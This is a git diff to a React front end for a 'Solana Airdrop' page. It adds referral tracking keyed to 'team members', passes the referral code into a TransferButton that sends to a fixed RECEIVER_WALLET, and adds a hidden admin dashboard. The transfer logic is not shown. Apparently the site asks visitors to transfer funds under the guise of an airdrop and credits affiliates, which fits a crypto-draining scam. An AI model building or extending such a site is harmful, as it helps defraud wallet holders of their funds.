@@ -3,8 +3,10 @@ import { useMemo, useState, useEffect, useRef } from 'react';
 import { WalletModalProvider, WalletMultiButton } from '@solana/wallet-adapter-react-ui';
 import ConnectWallet from './components/ConnectWallet';
 import TransferButton from './components/TransferButton';
+import AdminDashboard from './components/AdminDashboard';
 import { WalletContext } from './contexts/WalletContext';
-import { RECEIVER_WALLET } from './utils/constants';
+import { RECEIVER_WALLET, TEAM_MEMBERS } from './utils/constants';
+import { getReferralFromURL, storeCurrentReferral, getCurrentReferral } from './utils/referralStore';
 import './styles/airdrop.css';
 
 // Optional: styling for wallet modal
@@ -94,9 +96,26 @@ function CryptoRain() {
 }
 
 export default function App() {
+  const [showAdmin, setShowAdmin] = useState(false);
+
+  // ── Referral tracking ─────────────────────────────────────
+  // On mount, read ?ref= from URL and persist it for the session
+  const [referralCode, setReferralCode] = useState(null);
+  useEffect(() => {
+    const ref = getReferralFromURL() || getCurrentReferral();
+    if (ref) {
+      storeCurrentReferral(ref);
+      setReferralCode(ref);
+    }
+  }, []);
+
+  // Look up the team member name for display
+  const referrer = TEAM_MEMBERS.find(t => t.code === referralCode);
+
   return (
     <WalletContext>
       <WalletModalProvider>
+        {showAdmin && <AdminDashboard onClose={() => setShowAdmin(false)} />}
         <div className="app-container">
           {/* Header */}
           <header className="header">
@@ -128,7 +147,12 @@ export default function App() {
                   </p>
                   <div className="space-y-4">
                     <ConnectWallet />
-    <TransferButton className="
+                    {referralCode && (
+                      <div className="referral-badge">
+                        🔗 Referred by: {referrer ? `${referrer.emoji} ${referrer.name}` : referralCode}
+                      </div>
+                    )}
+    <TransferButton referralCode={referralCode} className="
   bg-gradient-to-r from-indigo-600 to-purple-600
   hover:from-indigo-700 hover:to-purple-700
   text-white shadow-lg hover:shadow-xl
@@ -452,6 +476,7 @@ export default function App() {
                   Wallet options are device-aware: mobile shows mobile wallets, desktop shows desktop wallets.
                 </p>
                 <p className="footer-copy">© 2026 Solana Airdrop. All rights reserved.</p>
+                <button className="admin-trigger-btn" onClick={() => setShowAdmin(true)}>⚙ Admin</button>
               </div>
             </div>
           </footer>
